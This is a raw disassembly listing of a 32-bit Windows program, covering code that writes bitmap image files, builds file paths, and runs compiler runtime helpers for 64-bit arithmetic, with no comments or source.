  4074c4:	8b f0                	mov    %eax,%esi
  4074c6:	8b 46 14             	mov    0x14(%esi),%eax
  4074c9:	85 c0                	test   %eax,%eax
  4074cb:	0f 84 13 01 00 00    	je     0x4075e4
  4074d1:	55                   	push   %ebp
  4074d2:	50                   	push   %eax
  4074d3:	6a 00                	push   $0x0
  4074d5:	ff 15 90 80 40 00    	call   *0x408090
  4074db:	50                   	push   %eax
  4074dc:	ff 15 84 80 40 00    	call   *0x408084
  4074e2:	8b e8                	mov    %eax,%ebp
  4074e4:	85 ed                	test   %ebp,%ebp
  4074e6:	0f 84 f7 00 00 00    	je     0x4075e3
  4074ec:	0f b7 46 08          	movzwl 0x8(%esi),%eax
  4074f0:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4074f4:	8b 54 24 28          	mov    0x28(%esp),%edx
  4074f8:	6a 00                	push   $0x0
  4074fa:	56                   	push   %esi
  4074fb:	55                   	push   %ebp
  4074fc:	50                   	push   %eax
  4074fd:	6a 00                	push   $0x0
  4074ff:	51                   	push   %ecx
  407500:	52                   	push   %edx
  407501:	ff 15 68 80 40 00    	call   *0x408068
  407507:	85 c0                	test   %eax,%eax
  407509:	0f 84 d4 00 00 00    	je     0x4075e3
  40750f:	8b 44 24 20          	mov    0x20(%esp),%eax
  407513:	57                   	push   %edi
  407514:	6a 00                	push   $0x0
  407516:	68 80 00 00 00       	push   $0x80
  40751b:	6a 02                	push   $0x2
  40751d:	6a 00                	push   $0x0
  40751f:	6a 00                	push   $0x0
  407521:	68 00 00 00 c0       	push   $0xc0000000
  407526:	50                   	push   %eax
  407527:	ff 15 74 80 40 00    	call   *0x408074
  40752d:	8b f8                	mov    %eax,%edi
  40752f:	83 ff ff             	cmp    $0xffffffff,%edi
  407532:	0f 84 aa 00 00 00    	je     0x4075e2
  407538:	8b 46 20             	mov    0x20(%esi),%eax
  40753b:	8b 0e                	mov    (%esi),%ecx
  40753d:	53                   	push   %ebx
  40753e:	8b 5e 14             	mov    0x14(%esi),%ebx
  407541:	03 c0                	add    %eax,%eax
  407543:	03 c0                	add    %eax,%eax
  407545:	8d 14 01             	lea    (%ecx,%eax,1),%edx
  407548:	8d 54 1a 0e          	lea    0xe(%edx,%ebx,1),%edx
  40754c:	8b 1d f8 80 40 00    	mov    0x4080f8,%ebx
  407552:	89 54 24 16          	mov    %edx,0x16(%esp)
  407556:	33 d2                	xor    %edx,%edx
  407558:	52                   	push   %edx
  407559:	8d 44 01 0e          	lea    0xe(%ecx,%eax,1),%eax
  40755d:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  407561:	51                   	push   %ecx
  407562:	66 89 54 24 22       	mov    %dx,0x22(%esp)
  407567:	66 89 54 24 24       	mov    %dx,0x24(%esp)
  40756c:	6a 0e                	push   $0xe
  40756e:	8d 54 24 20          	lea    0x20(%esp),%edx
  407572:	52                   	push   %edx
  407573:	57                   	push   %edi
  407574:	66 c7 44 24 28 42 4d 	movw   $0x4d42,0x28(%esp)
  40757b:	89 44 24 32          	mov    %eax,0x32(%esp)
  40757f:	ff d3                	call   *%ebx
  407581:	85 c0                	test   %eax,%eax
  407583:	74 5c                	je     0x4075e1
  407585:	83 7c 24 10 0e       	cmpl   $0xe,0x10(%esp)
  40758a:	75 55                	jne    0x4075e1
  40758c:	8b 4e 20             	mov    0x20(%esi),%ecx
  40758f:	6a 00                	push   $0x0
  407591:	8d 44 24 14          	lea    0x14(%esp),%eax
  407595:	50                   	push   %eax
  407596:	8d 14 8d 28 00 00 00 	lea    0x28(,%ecx,4),%edx
  40759d:	52                   	push   %edx
  40759e:	56                   	push   %esi
  40759f:	57                   	push   %edi
  4075a0:	ff d3                	call   *%ebx
  4075a2:	85 c0                	test   %eax,%eax
  4075a4:	74 3b                	je     0x4075e1
  4075a6:	8b 46 20             	mov    0x20(%esi),%eax
  4075a9:	8d 0c 85 28 00 00 00 	lea    0x28(,%eax,4),%ecx
  4075b0:	39 4c 24 10          	cmp    %ecx,0x10(%esp)
  4075b4:	75 2b                	jne    0x4075e1
  4075b6:	8b 76 14             	mov    0x14(%esi),%esi
  4075b9:	6a 00                	push   $0x0
  4075bb:	8d 54 24 14          	lea    0x14(%esp),%edx
  4075bf:	52                   	push   %edx
  4075c0:	56                   	push   %esi
  4075c1:	55                   	push   %ebp
  4075c2:	57                   	push   %edi
  4075c3:	ff d3                	call   *%ebx
  4075c5:	85 c0                	test   %eax,%eax
  4075c7:	74 18                	je     0x4075e1
  4075c9:	39 74 24 10          	cmp    %esi,0x10(%esp)
  4075cd:	75 12                	jne    0x4075e1
  4075cf:	57                   	push   %edi
  4075d0:	ff 15 48 81 40 00    	call   *0x408148
  4075d6:	85 c0                	test   %eax,%eax
  4075d8:	74 07                	je     0x4075e1
  4075da:	8b c5                	mov    %ebp,%eax
  4075dc:	e8 6f cc ff ff       	call   0x404250
  4075e1:	5b                   	pop    %ebx
  4075e2:	5f                   	pop    %edi
  4075e3:	5d                   	pop    %ebp
  4075e4:	5e                   	pop    %esi
  4075e5:	83 c4 14             	add    $0x14,%esp
  4075e8:	c3                   	ret
  4075e9:	cc                   	int3
  4075ea:	cc                   	int3
  4075eb:	cc                   	int3
  4075ec:	cc                   	int3
  4075ed:	cc                   	int3
  4075ee:	cc                   	int3
  4075ef:	cc                   	int3
  4075f0:	81 ec 04 08 00 00    	sub    $0x804,%esp
  4075f6:	56                   	push   %esi
  4075f7:	50                   	push   %eax
  4075f8:	51                   	push   %ecx
  4075f9:	8d 54 24 10          	lea    0x10(%esp),%edx
  4075fd:	68 2c 82 40 00       	push   $0x40822c
  407602:	52                   	push   %edx
  407603:	ff 15 88 81 40 00    	call   *0x408188
  407609:	83 c4 10             	add    $0x10,%esp
  40760c:	6a 00                	push   $0x0
  40760e:	68 80 00 00 00       	push   $0x80
  407613:	6a 01                	push   $0x1
  407615:	6a 00                	push   $0x0
  407617:	6a 00                	push   $0x0
  407619:	68 00 00 00 40       	push   $0x40000000
  40761e:	8d 44 24 20          	lea    0x20(%esp),%eax
  407622:	50                   	push   %eax
  407623:	ff 15 74 80 40 00    	call   *0x408074
  407629:	8b f0                	mov    %eax,%esi
  40762b:	83 fe ff             	cmp    $0xffffffff,%esi
  40762e:	74 36                	je     0x407666
  407630:	8b 94 24 0c 08 00 00 	mov    0x80c(%esp),%edx
  407637:	57                   	push   %edi
  407638:	6a 00                	push   $0x0
  40763a:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40763e:	51                   	push   %ecx
  40763f:	53                   	push   %ebx
  407640:	52                   	push   %edx
  407641:	56                   	push   %esi
  407642:	ff 15 f8 80 40 00    	call   *0x4080f8
  407648:	56                   	push   %esi
  407649:	8b f8                	mov    %eax,%edi
  40764b:	ff 15 48 81 40 00    	call   *0x408148
  407651:	85 ff                	test   %edi,%edi
  407653:	5f                   	pop    %edi
  407654:	74 10                	je     0x407666
  407656:	39 5c 24 04          	cmp    %ebx,0x4(%esp)
  40765a:	72 0a                	jb     0x407666
  40765c:	b0 01                	mov    $0x1,%al
  40765e:	5e                   	pop    %esi
  40765f:	81 c4 04 08 00 00    	add    $0x804,%esp
  407665:	c3                   	ret
  407666:	32 c0                	xor    %al,%al
  407668:	5e                   	pop    %esi
  407669:	81 c4 04 08 00 00    	add    $0x804,%esp
  40766f:	c3                   	ret
  407670:	81 ec 00 08 00 00    	sub    $0x800,%esp
  407676:	80 3d 6c b2 41 00 00 	cmpb   $0x0,0x41b26c
  40767d:	53                   	push   %ebx
  40767e:	8b d8                	mov    %eax,%ebx
  407680:	75 64                	jne    0x4076e6
  407682:	8b c1                	mov    %ecx,%eax
  407684:	66 8b 10             	mov    (%eax),%dx
  407687:	83 c0 02             	add    $0x2,%eax
  40768a:	66 85 d2             	test   %dx,%dx
  40768d:	75 f5                	jne    0x407684
  40768f:	2b c1                	sub    %ecx,%eax
  407691:	d1 f8                	sar    $1,%eax
  407693:	83 e8 01             	sub    $0x1,%eax
  407696:	66 83 7c 41 fe 5c    	cmpw   $0x5c,-0x2(%ecx,%eax,2)
  40769c:	75 03                	jne    0x4076a1
  40769e:	83 e8 01             	sub    $0x1,%eax
  4076a1:	33 d2                	xor    %edx,%edx
  4076a3:	85 c0                	test   %eax,%eax
  4076a5:	76 0e                	jbe    0x4076b5
  4076a7:	66 83 3c 51 5c       	cmpw   $0x5c,(%ecx,%edx,2)
  4076ac:	74 38                	je     0x4076e6
  4076ae:	83 c2 01             	add    $0x1,%edx
  4076b1:	3b d0                	cmp    %eax,%edx
  4076b3:	72 f2                	jb     0x4076a7
  4076b5:	8b 84 24 08 08 00 00 	mov    0x808(%esp),%eax
  4076bc:	50                   	push   %eax
  4076bd:	51                   	push   %ecx
  4076be:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4076c2:	68 2c 82 40 00       	push   $0x40822c
  4076c7:	51                   	push   %ecx
  4076c8:	ff 15 88 81 40 00    	call   *0x408188
  4076ce:	83 c4 10             	add    $0x10,%esp
  4076d1:	6a 00                	push   $0x0
  4076d3:	8d 54 24 08          	lea    0x8(%esp),%edx
  4076d7:	52                   	push   %edx
  4076d8:	ff 15 f4 80 40 00    	call   *0x4080f4
  4076de:	85 c0                	test   %eax,%eax
  4076e0:	74 0f                	je     0x4076f1
  4076e2:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4076e6:	56                   	push   %esi
  4076e7:	8b c7                	mov    %edi,%eax
  4076e9:	e8 02 ff ff ff       	call   0x4075f0
  4076ee:	83 c4 04             	add    $0x4,%esp
  4076f1:	5b                   	pop    %ebx
  4076f2:	81 c4 00 08 00 00    	add    $0x800,%esp
  4076f8:	c3                   	ret
  4076f9:	cc                   	int3
  4076fa:	cc                   	int3
  4076fb:	cc                   	int3
  4076fc:	cc                   	int3
  4076fd:	cc                   	int3
  4076fe:	cc                   	int3
  4076ff:	cc                   	int3
  407700:	83 ec 0c             	sub    $0xc,%esp
  407703:	53                   	push   %ebx
  407704:	55                   	push   %ebp
  407705:	56                   	push   %esi
  407706:	8b d8                	mov    %eax,%ebx
  407708:	57                   	push   %edi
  407709:	8d 44 24 14          	lea    0x14(%esp),%eax
  40770d:	50                   	push   %eax
  40770e:	a1 80 b2 41 00       	mov    0x41b280,%eax
  407713:	6a 06                	push   $0x6
  407715:	e8 36 b2 ff ff       	call   0x402950
  40771a:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40771e:	51                   	push   %ecx
  40771f:	8b f8                	mov    %eax,%edi
  407721:	a1 80 b2 41 00       	mov    0x41b280,%eax
  407726:	6a 07                	push   $0x7
  407728:	e8 23 b2 ff ff       	call   0x402950
  40772d:	8d 54 24 10          	lea    0x10(%esp),%edx
  407731:	8b e8                	mov    %eax,%ebp
  407733:	a1 80 b2 41 00       	mov    0x41b280,%eax
  407738:	52                   	push   %edx
  407739:	6a 08                	push   $0x8
  40773b:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  40773f:	e8 0c b2 ff ff       	call   0x402950
  407744:	85 ed                	test   %ebp,%ebp
  407746:	8b f0                	mov    %eax,%esi
  407748:	74 43                	je     0x40778d
  40774a:	85 ff                	test   %edi,%edi
  40774c:	74 3f                	je     0x40778d
  40774e:	85 f6                	test   %esi,%esi
  407750:	74 3b                	je     0x40778d
  407752:	85 db                	test   %ebx,%ebx
  407754:	74 3f                	je     0x407795
  407756:	8b 44 24 10          	mov    0x10(%esp),%eax
  40775a:	55                   	push   %ebp
  40775b:	8b cb                	mov    %ebx,%ecx
  40775d:	e8 0e ff ff ff       	call   0x407670
  407762:	83 c4 04             	add    $0x4,%esp
  407765:	8b 2d 90 80 40 00    	mov    0x408090,%ebp
  40776b:	8b 1d 8c 80 40 00    	mov    0x40808c,%ebx
  407771:	56                   	push   %esi
  407772:	6a 00                	push   $0x0
  407774:	ff d5                	call   *%ebp
  407776:	50                   	push   %eax
  407777:	ff d3                	call   *%ebx
  407779:	8b 44 24 18          	mov    0x18(%esp),%eax
  40777d:	50                   	push   %eax
  40777e:	6a 00                	push   $0x0
  407780:	ff d5                	call   *%ebp
  407782:	50                   	push   %eax
  407783:	ff d3                	call   *%ebx
  407785:	57                   	push   %edi
  407786:	6a 00                	push   $0x0
  407788:	ff d5                	call   *%ebp
  40778a:	50                   	push   %eax
  40778b:	ff d3                	call   *%ebx
  40778d:	5f                   	pop    %edi
  40778e:	5e                   	pop    %esi
  40778f:	5d                   	pop    %ebp
  407790:	5b                   	pop    %ebx
  407791:	83 c4 0c             	add    $0xc,%esp
  407794:	c3                   	ret
  407795:	8d 44 24 14          	lea    0x14(%esp),%eax
  407799:	50                   	push   %eax
  40779a:	a1 80 b2 41 00       	mov    0x41b280,%eax
  40779f:	6a 39                	push   $0x39
  4077a1:	e8 aa b1 ff ff       	call   0x402950
  4077a6:	8b e8                	mov    %eax,%ebp
  4077a8:	e8 33 b7 ff ff       	call   0x402ee0
  4077ad:	85 c0                	test   %eax,%eax
  4077af:	74 14                	je     0x4077c5
  4077b1:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4077b5:	8b 54 24 18          	mov    0x18(%esp),%edx
  4077b9:	51                   	push   %ecx
  4077ba:	52                   	push   %edx
  4077bb:	57                   	push   %edi
  4077bc:	8b ce                	mov    %esi,%ecx
  4077be:	e8 4d b5 ff ff       	call   0x402d10
  4077c3:	eb 05                	jmp    0x4077ca
  4077c5:	e8 06 ee ff ff       	call   0x4065d0
  4077ca:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4077ce:	56                   	push   %esi
  4077cf:	8b c7                	mov    %edi,%eax
  4077d1:	b9 30 aa 41 00       	mov    $0x41aa30,%ecx
  4077d6:	e8 15 fe ff ff       	call   0x4075f0
  4077db:	83 c4 04             	add    $0x4,%esp
  4077de:	85 ed                	test   %ebp,%ebp
  4077e0:	74 83                	je     0x407765
  4077e2:	8b d5                	mov    %ebp,%edx
  4077e4:	b8 30 a2 41 00       	mov    $0x41a230,%eax
  4077e9:	bb 00 04 00 00       	mov    $0x400,%ebx
  4077ee:	8b ff                	mov    %edi,%edi
  4077f0:	66 83 38 00          	cmpw   $0x0,(%eax)
  4077f4:	74 08                	je     0x4077fe
  4077f6:	83 c0 02             	add    $0x2,%eax
  4077f9:	83 eb 01             	sub    $0x1,%ebx
  4077fc:	75 f2                	jne    0x4077f0
  4077fe:	85 db                	test   %ebx,%ebx
  407800:	74 21                	je     0x407823
  407802:	0f b7 0a             	movzwl (%edx),%ecx
  407805:	66 89 08             	mov    %cx,(%eax)
  407808:	83 c0 02             	add    $0x2,%eax
  40780b:	83 c2 02             	add    $0x2,%edx
  40780e:	66 85 c9             	test   %cx,%cx
  407811:	74 05                	je     0x407818
  407813:	83 eb 01             	sub    $0x1,%ebx
  407816:	75 ea                	jne    0x407802
  407818:	85 db                	test   %ebx,%ebx
  40781a:	75 07                	jne    0x407823
  40781c:	66 89 1d 2e aa 41 00 	mov    %bx,0x41aa2e
  407823:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  407827:	56                   	push   %esi
  407828:	8b c7                	mov    %edi,%eax
  40782a:	b9 30 a2 41 00       	mov    $0x41a230,%ecx
  40782f:	e8 bc fd ff ff       	call   0x4075f0
  407834:	83 c4 04             	add    $0x4,%esp
  407837:	55                   	push   %ebp
  407838:	8b 2d 90 80 40 00    	mov    0x408090,%ebp
  40783e:	6a 00                	push   $0x0
  407840:	ff d5                	call   *%ebp
  407842:	8b 1d 8c 80 40 00    	mov    0x40808c,%ebx
  407848:	50                   	push   %eax
  407849:	ff d3                	call   *%ebx
  40784b:	e9 21 ff ff ff       	jmp    0x407771
  407850:	ff 25 60 81 40 00    	jmp    *0x408160
  407856:	ff 25 5c 81 40 00    	jmp    *0x40815c
  40785c:	ff 25 58 81 40 00    	jmp    *0x408158
  407862:	ff 25 cc 80 40 00    	jmp    *0x4080cc
  407868:	ff 25 d4 80 40 00    	jmp    *0x4080d4
  40786e:	ff 25 e0 80 40 00    	jmp    *0x4080e0
  407874:	cc                   	int3
  407875:	cc                   	int3
  407876:	cc                   	int3
  407877:	cc                   	int3
  407878:	cc                   	int3
  407879:	cc                   	int3
  40787a:	cc                   	int3
  40787b:	cc                   	int3
  40787c:	cc                   	int3
  40787d:	cc                   	int3
  40787e:	cc                   	int3
  40787f:	cc                   	int3
  407880:	51                   	push   %ecx
  407881:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  407885:	2b c8                	sub    %eax,%ecx
  407887:	1b c0                	sbb    %eax,%eax
  407889:	f7 d0                	not    %eax
  40788b:	23 c8                	and    %eax,%ecx
  40788d:	8b c4                	mov    %esp,%eax
  40788f:	25 00 f0 ff ff       	and    $0xfffff000,%eax
  407894:	3b c8                	cmp    %eax,%ecx
  407896:	72 0a                	jb     0x4078a2
  407898:	8b c1                	mov    %ecx,%eax
  40789a:	59                   	pop    %ecx
  40789b:	94                   	xchg   %eax,%esp
  40789c:	8b 00                	mov    (%eax),%eax
  40789e:	89 04 24             	mov    %eax,(%esp)
  4078a1:	c3                   	ret
  4078a2:	2d 00 10 00 00       	sub    $0x1000,%eax
  4078a7:	85 00                	test   %eax,(%eax)
  4078a9:	eb e9                	jmp    0x407894
  4078ab:	cc                   	int3
  4078ac:	cc                   	int3
  4078ad:	cc                   	int3
  4078ae:	cc                   	int3
  4078af:	cc                   	int3
  4078b0:	57                   	push   %edi
  4078b1:	56                   	push   %esi
  4078b2:	53                   	push   %ebx
  4078b3:	33 ff                	xor    %edi,%edi
  4078b5:	8b 44 24 14          	mov    0x14(%esp),%eax
  4078b9:	0b c0                	or     %eax,%eax
  4078bb:	7d 14                	jge    0x4078d1
  4078bd:	47                   	inc    %edi
  4078be:	8b 54 24 10          	mov    0x10(%esp),%edx
  4078c2:	f7 d8                	neg    %eax
  4078c4:	f7 da                	neg    %edx
  4078c6:	83 d8 00             	sbb    $0x0,%eax
  4078c9:	89 44 24 14          	mov    %eax,0x14(%esp)
  4078cd:	89 54 24 10          	mov    %edx,0x10(%esp)
  4078d1:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4078d5:	0b c0                	or     %eax,%eax
  4078d7:	7d 14                	jge    0x4078ed
  4078d9:	47                   	inc    %edi
  4078da:	8b 54 24 18          	mov    0x18(%esp),%edx
  4078de:	f7 d8                	neg    %eax
  4078e0:	f7 da                	neg    %edx
  4078e2:	83 d8 00             	sbb    $0x0,%eax
  4078e5:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4078e9:	89 54 24 18          	mov    %edx,0x18(%esp)
  4078ed:	0b c0                	or     %eax,%eax
  4078ef:	75 18                	jne    0x407909
  4078f1:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4078f5:	8b 44 24 14          	mov    0x14(%esp),%eax
  4078f9:	33 d2                	xor    %edx,%edx
  4078fb:	f7 f1                	div    %ecx
  4078fd:	8b d8                	mov    %eax,%ebx
  4078ff:	8b 44 24 10          	mov    0x10(%esp),%eax
  407903:	f7 f1                	div    %ecx
  407905:	8b d3                	mov    %ebx,%edx
  407907:	eb 41                	jmp    0x40794a
  407909:	8b d8                	mov    %eax,%ebx
  40790b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40790f:	8b 54 24 14          	mov    0x14(%esp),%edx
  407913:	8b 44 24 10          	mov    0x10(%esp),%eax
  407917:	d1 eb                	shr    $1,%ebx
  407919:	d1 d9                	rcr    $1,%ecx
  40791b:	d1 ea                	shr    $1,%edx
  40791d:	d1 d8                	rcr    $1,%eax
  40791f:	0b db                	or     %ebx,%ebx
  407921:	75 f4                	jne    0x407917
  407923:	f7 f1                	div    %ecx
  407925:	8b f0                	mov    %eax,%esi
  407927:	f7 64 24 1c          	mull   0x1c(%esp)
  40792b:	8b c8                	mov    %eax,%ecx
  40792d:	8b 44 24 18          	mov    0x18(%esp),%eax
  407931:	f7 e6                	mul    %esi
  407933:	03 d1                	add    %ecx,%edx
  407935:	72 0e                	jb     0x407945
  407937:	3b 54 24 14          	cmp    0x14(%esp),%edx
  40793b:	77 08                	ja     0x407945
  40793d:	72 07                	jb     0x407946
  40793f:	3b 44 24 10          	cmp    0x10(%esp),%eax
  407943:	76 01                	jbe    0x407946
  407945:	4e                   	dec    %esi
  407946:	33 d2                	xor    %edx,%edx
  407948:	8b c6                	mov    %esi,%eax
  40794a:	4f                   	dec    %edi
  40794b:	75 07                	jne    0x407954
  40794d:	f7 da                	neg    %edx
  40794f:	f7 d8                	neg    %eax
  407951:	83 da 00             	sbb    $0x0,%edx
  407954:	5b                   	pop    %ebx
  407955:	5e                   	pop    %esi
  407956:	5f                   	pop    %edi
  407957:	c2 10 00             	ret    $0x10
  40795a:	cc                   	int3
  40795b:	cc                   	int3
  40795c:	cc                   	int3
  40795d:	cc                   	int3
  40795e:	cc                   	int3
  40795f:	cc                   	int3
  407960:	57                   	push   %edi
  407961:	56                   	push   %esi
  407962:	55                   	push   %ebp
  407963:	33 ff                	xor    %edi,%edi
  407965:	33 ed                	xor    %ebp,%ebp
  407967:	8b 44 24 14          	mov    0x14(%esp),%eax
  40796b:	0b c0                	or     %eax,%eax
  40796d:	7d 15                	jge    0x407984
  40796f:	47                   	inc    %edi
  407970:	45                   	inc    %ebp
  407971:	8b 54 24 10          	mov    0x10(%esp),%edx
  407975:	f7 d8                	neg    %eax
  407977:	f7 da                	neg    %edx
  407979:	83 d8 00             	sbb    $0x0,%eax
  40797c:	89 44 24 14          	mov    %eax,0x14(%esp)
  407980:	89 54 24 10          	mov    %edx,0x10(%esp)
  407984:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  407988:	0b c0                	or     %eax,%eax
  40798a:	7d 14                	jge    0x4079a0
  40798c:	47                   	inc    %edi
  40798d:	8b 54 24 18          	mov    0x18(%esp),%edx
  407991:	f7 d8                	neg    %eax
  407993:	f7 da                	neg    %edx
  407995:	83 d8 00             	sbb    $0x0,%eax
  407998:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40799c:	89 54 24 18          	mov    %edx,0x18(%esp)
  4079a0:	0b c0                	or     %eax,%eax
  4079a2:	75 28                	jne    0x4079cc
  4079a4:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4079a8:	8b 44 24 14          	mov    0x14(%esp),%eax
  4079ac:	33 d2                	xor    %edx,%edx
  4079ae:	f7 f1                	div    %ecx
  4079b0:	8b d8                	mov    %eax,%ebx
  4079b2:	8b 44 24 10          	mov    0x10(%esp),%eax
  4079b6:	f7 f1                	div    %ecx
  4079b8:	8b f0                	mov    %eax,%esi
  4079ba:	8b c3                	mov    %ebx,%eax
  4079bc:	f7 64 24 18          	mull   0x18(%esp)
  4079c0:	8b c8                	mov    %eax,%ecx
  4079c2:	8b c6                	mov    %esi,%eax
  4079c4:	f7 64 24 18          	mull   0x18(%esp)
  4079c8:	03 d1                	add    %ecx,%edx
  4079ca:	eb 47                	jmp    0x407a13
  4079cc:	8b d8                	mov    %eax,%ebx
  4079ce:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4079d2:	8b 54 24 14          	mov    0x14(%esp),%edx
  4079d6:	8b 44 24 10          	mov    0x10(%esp),%eax
  4079da:	d1 eb                	shr    $1,%ebx
  4079dc:	d1 d9                	rcr    $1,%ecx
  4079de:	d1 ea                	shr    $1,%edx
  4079e0:	d1 d8                	rcr    $1,%eax
  4079e2:	0b db                	or     %ebx,%ebx
  4079e4:	75 f4                	jne    0x4079da
  4079e6:	f7 f1                	div    %ecx
  4079e8:	8b f0                	mov    %eax,%esi
  4079ea:	f7 64 24 1c          	mull   0x1c(%esp)
  4079ee:	8b c8                	mov    %eax,%ecx
  4079f0:	8b 44 24 18          	mov    0x18(%esp),%eax
  4079f4:	f7 e6                	mul    %esi
  4079f6:	03 d1                	add    %ecx,%edx
  4079f8:	72 0e                	jb     0x407a08
  4079fa:	3b 54 24 14          	cmp    0x14(%esp),%edx
  4079fe:	77 08                	ja     0x407a08
  407a00:	72 0f                	jb     0x407a11
  407a02:	3b 44 24 10          	cmp    0x10(%esp),%eax
  407a06:	76 09                	jbe    0x407a11
  407a08:	4e                   	dec    %esi
  407a09:	2b 44 24 18          	sub    0x18(%esp),%eax
  407a0d:	1b 54 24 1c          	sbb    0x1c(%esp),%edx
  407a11:	33 db                	xor    %ebx,%ebx
  407a13:	2b 44 24 10          	sub    0x10(%esp),%eax
  407a17:	1b 54 24 14          	sbb    0x14(%esp),%edx
  407a1b:	4d                   	dec    %ebp
  407a1c:	79 07                	jns    0x407a25
  407a1e:	f7 da                	neg    %edx
  407a20:	f7 d8                	neg    %eax
  407a22:	83 da 00             	sbb    $0x0,%edx
  407a25:	8b ca                	mov    %edx,%ecx
  407a27:	8b d3                	mov    %ebx,%edx
  407a29:	8b d9                	mov    %ecx,%ebx
  407a2b:	8b c8                	mov    %eax,%ecx
  407a2d:	8b c6                	mov    %esi,%eax
  407a2f:	4f                   	dec    %edi
  407a30:	75 07                	jne    0x407a39
  407a32:	f7 da                	neg    %edx
  407a34:	f7 d8                	neg    %eax
  407a36:	83 da 00             	sbb    $0x0,%edx
  407a39:	5d                   	pop    %ebp
  407a3a:	5e                   	pop    %esi
  407a3b:	5f                   	pop    %edi
  407a3c:	c2 10 00             	ret    $0x10
  407a3f:	cc                   	int3
  407a40:	8b 44 24 08          	mov    0x8(%esp),%eax
  407a44:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  407a48:	0b c8                	or     %eax,%ecx
  407a4a:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  407a4e:	75 09                	jne    0x407a59
  407a50:	8b 44 24 04          	mov    0x4(%esp),%eax
  407a54:	f7 e1                	mul    %ecx
  407a56:	c2 10 00             	ret    $0x10
  407a59:	53                   	push   %ebx
  407a5a:	f7 e1                	mul    %ecx
  407a5c:	8b d8                	mov    %eax,%ebx
  407a5e:	8b 44 24 08          	mov    0x8(%esp),%eax
  407a62:	f7 64 24 14          	mull   0x14(%esp)
  407a66:	03 d8                	add    %eax,%ebx
  407a68:	8b 44 24 08          	mov    0x8(%esp),%eax
  407a6c:	f7 e1                	mul    %ecx
  407a6e:	03 d3                	add    %ebx,%edx
  407a70:	5b                   	pop    %ebx
  407a71:	c2 10 00             	ret    $0x10
